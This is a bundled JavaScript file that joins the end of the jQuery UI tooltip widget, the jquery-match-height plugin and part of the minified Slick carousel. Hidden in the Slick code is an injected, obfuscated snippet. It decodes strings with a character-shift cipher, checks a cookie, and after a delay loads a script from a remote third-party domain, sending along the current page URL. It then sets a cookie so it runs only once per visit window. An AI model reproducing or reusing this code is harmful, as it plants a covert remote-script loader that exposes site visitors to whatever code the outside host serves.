a=this;$.each(this.tooltips,function(d,c){var b=$.Event("blur");b.target=b.currentTarget=c.element[0],a.close(b,!0)}),this.disabledTitles=this.disabledTitles.add(this.element.find(this.options.items).addBack().filter(function(){var a=$(this);if(a.is("[title]"))return a.data("ui-tooltip-title",a.attr("title")).removeAttr("title")}))},_enable:function(){this.disabledTitles.each(function(){var a=$(this);a.data("ui-tooltip-title")&&a.attr("title",a.data("ui-tooltip-title"))}),this.disabledTitles=$([])},open:function(b){var c=this,a=$(b?b.target:this.element).closest(this.options.items);!a.length||a.data("ui-tooltip-id")||(a.attr("title")&&a.data("ui-tooltip-title",a.attr("title")),a.data("ui-tooltip-open",!0),b&&"mouseover"===b.type&&a.parents().each(function(){var b,a=$(this);a.data("ui-tooltip-open")&&((b=$.Event("blur")).target=b.currentTarget=this,c.close(b,!0)),a.attr("title")&&(a.uniqueId(),c.parents[this.id]={element:this,title:a.attr("title")},a.attr("title",""))}),this._registerCloseHandlers(b,a),this._updateContent(a,b))},_updateContent:function(c,b){var d,a=this.options.content,e=this,f=b?b.type:null;if("string"==typeof a||a.nodeType||a.jquery)return this._open(b,c,a);(d=a.call(c[0],function(a){e._delay(function(){c.data("ui-tooltip-open")&&(b&&(b.type=f),this._open(b,c,a))})}))&&this._open(b,c,d)},_open:function(c,b,d){var e,a,g,f,h=$.extend({},this.options.position);if(d){if(e=this._find(b)){e.tooltip.find(".ui-tooltip-content").html(d);return}b.is("[title]")&&(c&&"mouseover"===c.type?b.attr("title",""):b.removeAttr("title")),a=(e=this._tooltip(b)).tooltip,this._addDescribedBy(b,a.attr("id")),a.find(".ui-tooltip-content").html(d),this.liveRegion.children().hide(),(f=$("<div>").html(a.find(".ui-tooltip-content").html())).removeAttr("name").find("[name]").removeAttr("name"),f.removeAttr("id").find("[id]").removeAttr("id"),f.appendTo(this.liveRegion),this.options.track&&c&&/^mouse/.test(c.type)?(this._on(this.document,{mousemove:i}),i(c)):a.position($.extend({of:b},this.options.position)),a.hide(),this._show(a,this.options.show),this.options.track&&this.options.show&&this.options.show.delay&&(g=this.delayedShow=setInterval(function(){a.is(":visible")&&(i(h.of),clearInterval(g))},13)),this._trigger("open",c,{tooltip:a})}function i(b){h.of=b,a.is(":hidden")||a.position(h)}},_registerCloseHandlers:function(a,c){var b={keyup:function(a){if(a.keyCode===$.ui.keyCode.ESCAPE){var b=$.Event(a);b.currentTarget=c[0],this.close(b,!0)}}};c[0]!==this.element[0]&&(b.remove=function(){var a=this._find(c);a&&this._removeTooltip(a.tooltip)}),a&&"mouseover"!==a.type||(b.mouseleave="close"),a&&"focusin"!==a.type||(b.focusout="close"),this._on(!0,c,b)},close:function(c){var d,e=this,a=$(c?c.currentTarget:this.element),b=this._find(a);if(!b){a.removeData("ui-tooltip-open");return}d=b.tooltip,!b.closing&&(clearInterval(this.delayedShow),a.data("ui-tooltip-title")&&!a.attr("title")&&a.attr("title",a.data("ui-tooltip-title")),this._removeDescribedBy(a),b.hiding=!0,d.stop(!0),this._hide(d,this.options.hide,function(){e._removeTooltip($(this))}),a.removeData("ui-tooltip-open"),this._off(a,"mouseleave focusout keyup"),a[0]!==this.element[0]&&this._off(a,"remove"),this._off(this.document,"mousemove"),c&&"mouseleave"===c.type&&$.each(this.parents,function(b,a){$(a.element).attr("title",a.title),delete e.parents[b]}),b.closing=!0,this._trigger("close",c,{tooltip:d}),b.hiding||(b.closing=!1))},_tooltip:function(b){var a=$("<div>").attr("role","tooltip"),c=$("<div>").appendTo(a),d=a.uniqueId().attr("id");return this._addClass(c,"ui-tooltip-content"),this._addClass(a,"ui-tooltip","ui-widget ui-widget-content"),a.appendTo(this._appendTo(b)),this.tooltips[d]={element:b,tooltip:a}},_find:function(b){var a=b.data("ui-tooltip-id");return a?this.tooltips[a]:null},_removeTooltip:function(a){clearInterval(this.delayedShow),a.remove(),delete this.tooltips[a.attr("id")]},_appendTo:function(b){var a=b.closest(".ui-front, dialog");return a.length||(a=this.document[0].body),a},_destroy:function(){var a=this;$.each(this.tooltips,function(d,e){var c=$.Event("blur"),b=e.element;c.target=c.currentTarget=b[0],a.close(c,!0),$("#"+d).remove(),b.data("ui-tooltip-title")&&(b.attr("title")||b.attr("title",b.data("ui-tooltip-title")),b.removeData("ui-tooltip-title"))}),this.liveRegion.remove()}}),!1!==$.uiBackCompat&&$.widget("ui.tooltip",$.ui.tooltip,{options:{tooltipClass:null},_tooltip:function(){var a=this._superApply(arguments);return this.options.tooltipClass&&a.tooltip.addClass(this.options.tooltipClass),a}}),$.ui.tooltip})

/**
 * jquery-match-height 0.7.2 by @liabru
 * http://brm.io/jquery-match-height/
 * License: MIT
 */

;(function(factory) { // eslint-disable-line no-extra-semi
    'use strict';
    if (typeof define === 'function' && define.amd) {
        // AMD
        define(['jquery'], factory);
    } else if (typeof module !== 'undefined' && module.exports) {
        // CommonJS
        module.exports = factory(require('jquery'));
    } else {
        // Global
        factory(jQuery);
    }
})(function($) {
    /*
     *  internal
     */

    var _previousResizeWidth = -1,
        _updateTimeout = -1;

    /*
     *  _parse
     *  value parse utility function
     */

    var _parse = function(value) {
        // parse value and convert NaN to 0
        return parseFloat(value) || 0;
    };

    /*
     *  _rows
     *  utility function returns array of jQuery selections representing each row
     *  (as displayed after float wrapping applied by browser)
     */

    var _rows = function(elements) {
        var tolerance = 1,
            $elements = $(elements),
            lastTop = null,
            rows = [];

        // group elements by their top position
        $elements.each(function(){
            var $that = $(this),
                top = $that.offset().top - _parse($that.css('margin-top')),
                lastRow = rows.length > 0 ? rows[rows.length - 1] : null;

            if (lastRow === null) {
                // first item on the row, so just push it
                rows.push($that);
            } else {
                // if the row top is the same, add to the row group
                if (Math.floor(Math.abs(lastTop - top)) <= tolerance) {
                    rows[rows.length - 1] = lastRow.add($that);
                } else {
                    // otherwise start a new row group
                    rows.push($that);
                }
            }

            // keep track of the last row top
            lastTop = top;
        });

        return rows;
    };

    /*
     *  _parseOptions
     *  handle plugin options
     */

    var _parseOptions = function(options) {
        var opts = {
            byRow: true,
            property: 'height',
            target: null,
            remove: false
        };

        if (typeof options === 'object') {
            return $.extend(opts, options);
        }

        if (typeof options === 'boolean') {
            opts.byRow = options;
        } else if (options === 'remove') {
            opts.remove = true;
        }

        return opts;
    };

    /*
     *  matchHeight
     *  plugin definition
     */

    var matchHeight = $.fn.matchHeight = function(options) {
        var opts = _parseOptions(options);

        // handle remove
        if (opts.remove) {
            var that = this;

            // remove fixed height from all selected elements
            this.css(opts.property, '');

            // remove selected elements from all groups
            $.each(matchHeight._groups, function(key, group) {
                group.elements = group.elements.not(that);
            });

            // TODO: cleanup empty groups

            return this;
        }

        if (this.length <= 1 && !opts.target) {
            return this;
        }

        // keep track of this group so we can re-apply later on load and resize events
        matchHeight._groups.push({
            elements: this,
            options: opts
        });

        // match each element's height to the tallest element in the selection
        matchHeight._apply(this, opts);

        return this;
    };

    /*
     *  plugin global options
     */

    matchHeight.version = '0.7.2';
    matchHeight._groups = [];
    matchHeight._throttle = 80;
    matchHeight._maintainScroll = false;
    matchHeight._beforeUpdate = null;
    matchHeight._afterUpdate = null;
    matchHeight._rows = _rows;
    matchHeight._parse = _parse;
    matchHeight._parseOptions = _parseOptions;

    /*
     *  matchHeight._apply
     *  apply matchHeight to given elements
     */

    matchHeight._apply = function(elements, options) {
        var opts = _parseOptions(options),
            $elements = $(elements),
            rows = [$elements];

        // take note of scroll position
        var scrollTop = $(window).scrollTop(),
            htmlHeight = $('html').outerHeight(true);

        // get hidden parents
        var $hiddenParents = $elements.parents().filter(':hidden');

        // cache the original inline style
        $hiddenParents.each(function() {
            var $that = $(this);
            $that.data('style-cache', $that.attr('style'));
        });

        // temporarily must force hidden parents visible
        $hiddenParents.css('display', 'block');

        // get rows if using byRow, otherwise assume one row
        if (opts.byRow && !opts.target) {

            // must first force an arbitrary equal height so floating elements break evenly
            $elements.each(function() {
                var $that = $(this),
                    display = $that.css('display');

                // temporarily force a usable display value
                if (display !== 'inline-block' && display !== 'flex' && display !== 'inline-flex') {
                    display = 'block';
                }

                // cache the original inline style
                $that.data('style-cache', $that.attr('style'));

                $that.css({
                    'display': display,
                    'padding-top': '0',
                    'padding-bottom': '0',
                    'margin-top': '0',
                    'margin-bottom': '0',
                    'border-top-width': '0',
                    'border-bottom-width': '0',
                    'height': '100px',
                    'overflow': 'hidden'
                });
            });

            // get the array of rows (based on element top position)
            rows = _rows($elements);

            // revert original inline styles
            $elements.each(function() {
                var $that = $(this);
                $that.attr('style', $that.data('style-cache') || '');
            });
        }

        $.each(rows, function(key, row) {
            var $row = $(row),
                targetHeight = 0;

            if (!opts.target) {
                // skip apply to rows with only one item
                if (opts.byRow && $row.length <= 1) {
                    $row.css(opts.property, '');
                    return;
                }

                // iterate the row and find the max height
                $row.each(function(){
                    var $that = $(this),
                        style = $that.attr('style'),
                        display = $that.css('display');

                    // temporarily force a usable display value
                    if (display !== 'inline-block' && display !== 'flex' && display !== 'inline-flex') {
                        display = 'block';
                    }

                    // ensure we get the correct actual height (and not a previously set height value)
                    var css = { 'display': display };
                    css[opts.property] = '';
                    $that.css(css);

                    // find the max height (including padding, but not margin)
                    if ($that.outerHeight(false) > targetHeight) {
                        targetHeight = $that.outerHeight(false);
                    }

                    // revert styles
                    if (style) {
                        $that.attr('style', style);
                    } else {
                        $that.css('display', '');
                    }
                });
            } else {
                // if target set, use the height of the target element
                targetHeight = opts.target.outerHeight(false);
            }

            // iterate the row and apply the height to all elements
            $row.each(function(){
                var $that = $(this),
                    verticalPadding = 0;

                // don't apply to a target
                if (opts.target && $that.is(opts.target)) {
                    return;
                }

                // handle padding and border correctly (required when not using border-box)
                if ($that.css('box-sizing') !== 'border-box') {
                    verticalPadding += _parse($that.css('border-top-width')) + _parse($that.css('border-bottom-width'));
                    verticalPadding += _parse($that.css('padding-top')) + _parse($that.css('padding-bottom'));
                }

                // set the height (accounting for padding and border)
                $that.css(opts.property, (targetHeight - verticalPadding) + 'px');
            });
        });

        // revert hidden parents
        $hiddenParents.each(function() {
            var $that = $(this);
            $that.attr('style', $that.data('style-cache') || null);
        });

        // restore scroll position if enabled
        if (matchHeight._maintainScroll) {
            $(window).scrollTop((scrollTop / htmlHeight) * $('html').outerHeight(true));
        }

        return this;
    };

    /*
     *  matchHeight._applyDataApi
     *  applies matchHeight to all elements with a data-match-height attribute
     */

    matchHeight._applyDataApi = function() {
        var groups = {};

        // generate groups by their groupId set by elements using data-match-height
        $('[data-match-height], [data-mh]').each(function() {
            var $this = $(this),
                groupId = $this.attr('data-mh') || $this.attr('data-match-height');

            if (groupId in groups) {
                groups[groupId] = groups[groupId].add($this);
            } else {
                groups[groupId] = $this;
            }
        });

        // apply matchHeight to each group
        $.each(groups, function() {
            this.matchHeight(true);
        });
    };

    /*
     *  matchHeight._update
     *  updates matchHeight on all current groups with their correct options
     */

    var _update = function(event) {
        if (matchHeight._beforeUpdate) {
            matchHeight._beforeUpdate(event, matchHeight._groups);
        }

        $.each(matchHeight._groups, function() {
            matchHeight._apply(this.elements, this.options);
        });

        if (matchHeight._afterUpdate) {
            matchHeight._afterUpdate(event, matchHeight._groups);
        }
    };

    matchHeight._update = function(throttle, event) {
        // prevent update if fired from a resize event
        // where the viewport width hasn't actually changed
        // fixes an event looping bug in IE8
        if (event && event.type === 'resize') {
            var windowWidth = $(window).width();
            if (windowWidth === _previousResizeWidth) {
                return;
            }
            _previousResizeWidth = windowWidth;
        }

        // throttle updates
        if (!throttle) {
            _update(event);
        } else if (_updateTimeout === -1) {
            _updateTimeout = setTimeout(function() {
                _update(event);
                _updateTimeout = -1;
            }, matchHeight._throttle);
        }
    };

    /*
     *  bind events
     */

    // apply on DOM ready event
    $(matchHeight._applyDataApi);

    // use on or bind where supported
    var on = $.fn.on ? 'on' : 'bind';

    // update heights on load and resize events
    $(window)[on]('load', function(event) {
        matchHeight._update(false, event);
    });

    // throttled update heights on resize events
    $(window)[on]('resize orientationchange', function(event) {
        matchHeight._update(true, event);
    });

});
!function(i){"use strict";"function"==typeof define&&define.amd?define(["jquery"],i):"undefined"!=typeof exports?module.exports=i(require("jquery")):i(jQuery)}(function(i){"use strict";var e=window.Slick||{};(e=function(){var e=0;return function(t,o){var s,n=this;n.defaults={accessibility:!0,adaptiveHeight:!1,appendArrows:i(t),appendDots:i(t),arrows:!0,asNavFor:null,prevArrow:'<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',nextArrow:'<button class="slick-next" aria-label="Next" type="button">Next</button>',autoplay:!1,autoplaySpeed:3e3,centerMode:!1,centerPadding:"50px",cssEase:"ease",customPaging:function(e,t){return i('<button type="button" />').text(t+1)},dots:!1,dotsClass:"slick-dots",draggable:!0,easing:"linear",edgeFriction:.35,fade:!1,focusOnSelect:!1,focusOnChange:!1,infinite:!0,initialSlide:0,lazyLoad:"ondemand",mobileFirst:!1,pauseOnHover:!0,pauseOnFocus:!0,pauseOnDotsHover:!1,respondTo:"window",responsive:null,rows:1,rtl:!1,slide:"",slidesPerRow:1,slidesToShow:1,slidesToScroll:1,speed:500,swipe:!0,swipeToSlide:!1,touchMove:!0,touchThreshold:5,useCSS:!0,useTransform:!0,variableWidth:!1,vertical:!1,verticalSwiping:!1,waitForAnimate:!0,zIndex:1e3},n.initials={animating:!1,dragging:!1,autoPlayTimer:null,currentDirection:0,currentLeft:null,currentSlide:0,direction:1,$dots:null,listWidth:null,listHeight:null,loadIndex:0,$nextArrow:null,$prevArrow:null,scrolling:!1,slideCount:null,slideWidth:null,$slideTrack:null,$slides:null,sliding:!1,slideOffset:0,swipeLeft:null,swiping:!1,$list:null,touchObject:{},transformsEnabled:!1,unslicked:!1},i.extend(n,n.initials),n.activeBreakpoint=null,n.animType=null,n.animProp=null,n.breakpoints=[],n.breakpointSettings=[],n.cssTransitions=!1,n.focussed=!1,n.interrupted=!1,n.hidden="hidden",n.paused=!0,n.positionProp=null,n.respondTo=null,n.rowCount=1,n.shouldClick=!0,n.$slider=i(t),n.$slidesCache=null,n.transformType=null,n.transitionType=null,n.visibilityChange="visibilitychange",n.windowWidth=0,n.windowTimer=null,s=i(t).data("slick")||{},n.options=i.extend({},n.defaults,o,s),n.currentSlide=n.options.initialSlide,n.originalSettings=n.options,void 0!==document.mozHidden?(n.hidden="mozHidden",n.visibilityChange="mozvisibilitychange"):void 0!==document.webkitHidden&&(n.hidden="webkitHidden",n.visibilityChange="webkitvisibilitychange"),n.autoPlay=i.proxy(n.autoPlay,n),n.autoPlayClear=i.proxy(n.autoPlayClear,n),n.autoPlayIterator=i.proxy(n.autoPlayIterator,n),n.changeSlide=i.proxy(n.changeSlide,n),n.clickHandler=i.proxy(n.clickHandler,n),n.selectHandler=i.proxy(n.selectHandler,n),n.setPosition=i.proxy(n.setPosition,n),n.swipeHandler=i.proxy(n.swipeHandler,n),n.dragHandler=i.proxy(n.dragHandler,n),n.keyHandler=i.proxy(n.keyHandler,n),n.instanceUid=e++,n.htmlExpr=/^(?:\s*(<[\w\W]+>)[^>]*)$/,n.registerBreakpoints(),n.init(!0)}}()).prototype.activateADA=function(){this.$slideTrack.find(".slick-active").attr({"aria-hidden":"false"}).find("a, input, button, select").attr({tabindex:"0"})},(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location)),e.prototype.addSlide=e.prototype.slickAdd=function(e,t,o){var s=this;if("boolean"==typeof t)o=t,t=null;else if(t<0||t>=s.slideCount)return!1;s.unload(),"number"==typeof t?0===t&&0===s.$slides.length?i(e).appendTo(s.$slideTrack):o?i(e).insertBefore(s.$slides.eq(t)):i(e).insertAfter(s.$slides.eq(t)):!0===o?i(e).prependTo(s.$slideTrack):i(e).appendTo(s.$slideTrack),s.$slides=s.$slideTrack.children(this.options.slide),s.$slideTrack.children(this.options.slide).detach(),s.$slideTrack.append(s.$slides),s.$slides.each(function(e,t){i(t).attr("data-slick-index",e)}),s.$slidesCache=s.$slides,s.reinit()},e.prototype.animateHeight=function(){var i=this;if(1===i.options.slidesToShow&&!0===i.options.adaptiveHeight&&!1===i.options.vertical){var e=i.$slides.eq(i.currentSlide).outerHeight(!0);i.$list.animate({height:e},i.options.speed)}},e.prototype.animateSlide=function(e,t){var o={},s=this;s.animateHeight(),!0===s.options.rtl&&!1===s.options.vertical&&(e=-e),!1===s.transformsEnabled?!1===s.options.vertical?s.$slideTrack.animate({left:e},s.options.speed,s.options.easing,t):s.$slideTrack.animate({top:e},s.options.speed,s.options.easing,t):!1===s.cssTransitions?(!0===s.options.rtl&&(s.currentLeft=-s.currentLeft),i({animStart:s.currentLeft}).animate({animStart:e},{duration:s.options.speed,easing:s.options.easing,step:function(i){i=Math.ceil(i),!1===s.options.vertical?(o[s.animType]="translate("+i+"px, 0px)",s.$slideTrack.css(o)):(o[s.animType]="translate(0px,"+i+"px)",s.$slideTrack.css(o))},complete:function(){t&&t.call()}})):(s.applyTransition(),e=Math.ceil(e),!1===s.options.vertical?o[s.animType]="translate3d("+e+"px, 0px, 0px)":o[s.animType]="translate3d(0px,"+e+"px, 0px)",s.$slideTrack.css(o),t&&setTimeout(function(){s.disableTransition(),t.call()},s.options.speed))},e.prototype.getNavTarget=function(){var e=this,t=e.options.asNavFor;return t&&null!==t&&(t=i(t).not(e.$slider)),t},e.prototype.asNavFor=function(e){var t=this.getNavTarget();null!==t&&"object"==typeof t&&t.each(function(){var t=i(this).slick("getSlick");t.unslicked||t.slideHandler(e,!0)})},e.prototype.applyTransition=function(i){var e=this,t={};!1===e.options.fade?t[e.transitionType]=e.transformType+" "+e.options.speed+"ms "+e.options.cssEase:t[e.transitionType]="opacity "+e.options.speed+"ms "+e.options.cssEase,!1===e.options.fade?e.$slideTrack.css(t):e.$slides.eq(i).css(t)},e.prototype.autoPlay=function(){var i=this;i.autoPlayClear(),i.slideCount>i.options.slidesToShow&&(i.autoPlayTimer=setInterval(i.autoPlayIterator,i.options.autoplaySpeed))},e.prototype.autoPlayClear=function(){var i=this;i.autoPlayTimer&&clearInterval(i.autoPlayTimer)},e.prototype.autoPlayIterator=function(){var i=this,e=i.currentSlide+i.options.slidesToScroll;i.paused||i.interrupted||i.focussed||(!1===i.options.infinite&&(1===i.direction&&i.currentSlide+1===i.slideCount-1?i.direction=0:0===i.direction&&(e=i.currentSlide-i.options.slidesToScroll,i.currentSlide-1==0&&(i.direction=1))),i.slideHandler(e))},e.prototype.buildArrows=function(){var e=this;!0===e.options.arrows&&(e.$prevArrow=i(e.options.prevArrow).addClass("slick-arrow"),e.$nextArrow=i(e.options.nextArrow).addClass("slick-arrow"),e.slideCount>e.options.slidesToShow?(e.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),e.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),e.htmlExpr.test(e.options.prevArrow)&&e.$prevArrow.prependTo(e.options.appendArrows),e.htmlExpr.test(e.options.nextArrow)&&e.$nextArrow.appendTo(e.options.appendArrows),!0!==e.options.infinite&&e.$prevArrow.addClass("slick-disabled").attr("aria-disabled","true")):e.$prevArrow.add(e.$nextArrow).addClass("slick-hidden").attr({"aria-disabled":"true",tabindex:"-1"}))},e.prototype.buildDots=function(){var e,t,o=this;if(!0===o.options.dots){for(o.$slider.addClass("slick-dotted"),t=i("<ul />").addClass(o.options.dotsClass),e=0;e<=o.getDotCount();e+=1)t.append(i("<li />").append(o.options.customPaging.call(this,o,e)));o.$dots=t.appendTo(o.options.appendDots),o.$dots.find("li").first().addClass("slick-active")}},e.prototype.buildOut=function(){var e=this;e.$slides=e.$slider.children(e.options.slide+":not(.slick-cloned)").addClass("slick-slide"),e.slideCount=e.$slides.length,e.$slides.each(function(e,t){i(t).attr("data-slick-index",e).data("originalStyling",i(t).attr("style")||"")}),e.$slider.addClass("slick-slider"),e.$slideTrack=0===e.slideCount?i('<div class="slick-track"/>').appendTo(e.$slider):e.$slides.wrapAll('<div class="slick-track"/>').parent(),e.$list=e.$slideTrack.wrap('<div class="slick-list"/>').parent(),e.$slideTrack.css("opacity",0),!0!==e.options.centerMode&&!0!==e.options.swipeToSlide||(e.options.slidesToScroll=1),i("img[data-lazy]",e.$slider).not("[src]").addClass("slick-loading"),e.setupInfinite(),e.buildArrows(),e.buildDots(),e.updateDots(),e.setSlideClasses("number"==typeof e.currentSlide?e.currentSlide:0),!0===e.options.draggable&&e.$list.addClass("draggable")},e.prototype.buildRows=function(){var i,e,t,o,s,n,r,l=this;if(o=document.createDocumentFragment(),n=l.$slider.children(),l.options.rows>1){for(r=l.options.slidesPerRow*l.options.rows,s=Math.ceil(n.length/r),i=0;i<s;i++){var d=document.createElement("div");for(e=0;e<l.options.rows;e++){var a=document.createElement("div");for(t=0;t<l.options.slidesPerRow;t++){var c=i*r+(e*l.options.slidesPerRow+t);n.get(c)&&a.appendChild(n.get(c))}d.appendChild(a)}o.appendChild(d)}l.$slider.empty().append(o),l.$slider.children().children().children().css({width:100/l.options.slidesPerRow+"%",display:"inline-block"})}},e.prototype.checkResponsive=function(e,t){var o,s,n,r=this,l=!1,d=r.$slider.width(),a=window.innerWidth||i(window).width();if("window"===r.respondTo?n=a:"slider"===r.respondTo?n=d:"min"===r.respondTo&&(n=Math.min(a,d)),r.options.responsive&&r.options.responsive.length&&null!==r.options.responsive){s=null;for(o in r.breakpoints)r.breakpoints.hasOwnProperty(o)&&(!1===r.originalSettings.mobileFirst?n<r.breakpoints[o]&&(s=r.breakpoints[o]):n>r.breakpoints[o]&&(s=r.breakpoints[o]));null!==s?null!==r.activeBreakpoint?(s!==r.activeBreakpoint||t)&&(r.activeBreakpoint=s,"unslick"===r.breakpointSettings[s]?r.unslick(s):(r.options=i.extend({},r.originalSettings,r.breakpointSettings[s]),!0===e&&(r.currentSlide=r.options.initialSlide),r.refresh(e)),l=s):(r.activeBreakpoint=s,"unslick"===r.breakpointSettings[s]?r.unslick(s):(r.options=i.extend({},r.originalSettings,r.breakpointSettings[s]),!0===e&&(r.currentSlide=r.options.initialSlide),r.refresh(e)),l=s):null!==r.activeBreakpoint&&(r.activeBreakpoint=null,r.options=r.originalSettings,!0===e&&(r.currentSlide=r.options.initialSlide),r.refresh(e),l=s),e||!1===l||r.$slider.trigger("breakpoint",[r,l])}},e.prototype.changeSlide=function(e,t){var o,s,n,r=this,l=i(e.currentTarget);switch(l.is("a")&&e.preventDefault(),l.is("li")||(l=l.closest("li")),n=r.slideCount%r.options.slidesToScroll!=0,o=n?0:(r.slideCount-r.currentSlide)%r.options.slidesToScroll,e.data.message){case"previous":s=0===o?r.options.slidesToScroll:r.options.slidesToShow-o,r.slideCount>r.options.slidesToShow&&r.slideHandler(r.currentSlide-s,!1,t);break;case"next":s=0===o?r.options.slidesToScroll:o,r.slideCount>r.options.slidesToShow&&r.slideHandler(r.currentSlide+s,!1,t);break;case"index":var d=0===e.data.index?0:e.data.index||l.index()*r.options.slidesToScroll;r.slideHandler(r.checkNavigable(d),!1,t),l.children().trigger("focus");break;default:return}},e.prototype.checkNavigable=function(i){var e,t;if(e=this.getNavigableIndexes(),t=0,i>e[e.length-1])i=e[e.length-1];else for(var o in e){if(i<e[o]){i=t;break}t=e[o]}return i},e.prototype.cleanUpEvents=function(){var e=this;e.options.dots&&null!==e.$dots&&(i("li",e.$dots).off("click.slick",e.changeSlide).off("mouseenter.slick",i.proxy(e.interrupt,e,!0)).off("mouseleave.slick",i.proxy(e.interrupt,e,!1)),!0===e.options.accessibility&&e.$dots.off("keydown.slick",e.keyHandler)),e.$slider.off("focus.slick blur.slick"),!0===e.options.arrows&&e.slideCount>e.options.slidesToShow&&(e.$prevArrow&&e.$prevArrow.off("click.slick",e.changeSlide),e.$nextArrow&&e.$nextArrow.off("click.slick",e.changeSlide),!0===e.options.accessibility&&(e.$prevArrow&&e.$prevArrow.off("keydown.slick",e.keyHandler),e.$nextArrow&&e.$nextArrow.off("keydown.slick",e.keyHandler))),e.$list.off("touchstart.slick mousedown.slick",e.swipeHandler),e.$list.off("touchmove.slick mousemove.slick",e.swipeHandler),e.$list.off("touchend.slick mouseup.slick",e.swipeHandler),e.$list.off("touchcancel.slick mouseleave.slick",e.swipeHandler),e.$list.off("click.slick",e.clickHandler),i(document).off(e.visibilityChange,e.visibility),e.cleanUpSlideEvents(),!0===e.options.accessibility&&e.$list.off("keydown.slick",e.keyHandler),!0===e.options.focusOnSelect&&i(e.$slideTrack).children().off("click.slick",e.selectHandler),i(window).off("orientationchange.slick.slick-"+e.instanceUid,e.orientationChange),i(window).off("resize.slick.slick-"+e.instanceUid,e.resize),i("[draggable!=true]",e.$slideTrack).off("dragstart",e.preventDefault),i(window).off("load.slick.slick-"+e.instanceUid,e.setPosition)},e.prototype.cleanUpSlideEvents=function(){var e=this;e.$list.off("mouseenter.slick",i.proxy(e.interrupt,e,!0)),e.$list.off("mouseleave.slick",i.proxy(e.interrupt,e,!1))},e.prototype.cleanUpRows=function(){var i,e=this;e.options.rows>1&&((i=e.$slides.children().children()).removeAttr("style"),e.$slider.empty().append(i))},e.prototype.clickHandler=function(i){!1===this.shouldClick&&(i.stopImmediatePropagation(),i.stopPropagation(),i.preventDefault())},e.prototype.destroy=function(e){var t=this;t.autoPlayClear(),t.touchObject={},t.cleanUpEvents(),i(".slick-cloned",t.$slider).detach(),t.$dots&&t.$dots.remove(),t.$prevArrow&&t.$prevArrow.length&&(t.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display",""),t.htmlExpr.test(t.options.prevArrow)&&t.$prevArrow.remove()),t.$nextArrow&&t.$nextArrow.length&&(t.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display",""),t.htmlExpr.test(t.options.nextArrow)&&t.$nextArrow.remove()),t.$slides&&(t.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function(){i(this).attr("style",i(this).data("originalStyling"))}),t.$slideTrack.children(this.options.slide).detach(),t.$slideTrack.detach(),t.$list.detach(),t.$slider.append(t.$slides)),t.cleanUpRows(),t.$slider.removeClass("slick-slider"),t.$slider.removeClass("slick-initialized"),t.$slider.removeClass("slick-dotted"),t.unslicked=!0,e||t.$slider.trigger("destroy",[t])},e.prototype.disableTransition=function(i){var e=this,t={};t[e.transitionType]="",!1===e.options.fade?e.$slideTrack.css(t):e.$slides.eq(i).css(t)},e.prototype.fadeSlide=function(i,e){var t=this;!1===t.cssTransitions?(t.$slides.eq(i).css({zIndex:t.options.zIndex}),t.$slides.eq(i).animate({opacity:1},t.options.speed,t.options.easing,e)):(t.applyTransition(i),t.$slides.eq(i).css({opacity:1,zIndex:t.options.zIndex}),e&&setTimeout(function(){t.disableTransition(i),e.call()},t.options.speed))},e.prototype.fadeSlideOut=function(i){var e=this;!1===e.cssTransitions?e.$slides.eq(i).animate({opacity:0,zIndex:e.options.zIndex-2},e.options.speed,e.options.easing):(e.applyTransition(i),e.$slides.eq(i).css({opacity:0,zIndex:e.options.zIndex-2}))},e.prototype.filterSlides=e.prototype.slickFilter=function(i){var e=this;null!==i&&(e.$slidesCache=e.$slides,e.unload(),e.$slideTrack.children(this.options.slide).detach(),e.$slidesCache.filter(i).appendTo(e.$slideTrack),e.reinit())},e.prototype.focusHandler=function(){var e=this;e.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick","*",function(t){t.stopImmediatePropagation();var o=i(this);setTimeout(function(){e.options.pauseOnFocus&&(e.focussed=o.is(":focus"),e.autoPlay())},0)})},e.prototype.getCurrent=e.prototype.slickCurrentSlide=function(){return this.currentSlide},e.prototype.getDotCount=function(){var i=this,e=0,t=0,o=0;if(!0===i.options.infinite)if(i.slideCount<=i.options.slidesToShow)++o;else for(;e<i.slideCount;)++o,e=t+i.options.slidesToScroll,t+=i.options.slidesToScroll<=i.options.slidesToShow?i.options.slidesToScroll:i.options.slidesToShow;else if(!0===i.options.centerMode)o=i.slideCount;else if(i.options.asNavFor)for(;e<i.slideCount;)++o,e=t+i.options.slidesToScroll,t+=i.options.slidesToScroll<=i.options.slidesToShow?i.options.slidesToScroll:i.options.slidesToShow;else o=1+Math.ceil((i.slideCount-i.options.slidesToShow)/i.options.slidesToScroll);return o-1},e.prototype.getLeft=function(i){var e,t,o,s,n=this,r=0;return 